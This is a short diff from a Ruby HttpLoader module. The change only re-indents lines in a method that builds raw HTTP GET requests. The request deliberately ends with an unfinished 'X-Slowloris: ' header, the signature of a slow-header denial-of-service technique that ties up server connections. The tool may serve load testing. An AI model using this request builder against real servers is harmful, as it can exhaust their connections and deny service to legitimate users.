@@ -73,9 +73,9 @@ module HttpLoader
         path = T.must(uri.path).empty? ? '/' : uri.path
         target = uri.query ? "#{path}?#{uri.query}" : path
         payload = "GET #{target} HTTP/1.1\r\n" \
-                  "Host: #{uri.host}\r\n" \
-                  "Connection: keep-alive\r\n" \
-                  "User-Agent: #{@config.user_agent}\r\n"
+          "Host: #{uri.host}\r\n" \
+          "Connection: keep-alive\r\n" \
+          "User-Agent: #{@config.user_agent}\r\n"
         @config.headers.each { |name, value| payload += "#{name}: #{value}\r\n" }
         # The trailing header is deliberately left unfinished.
         "#{payload}X-Slowloris: "
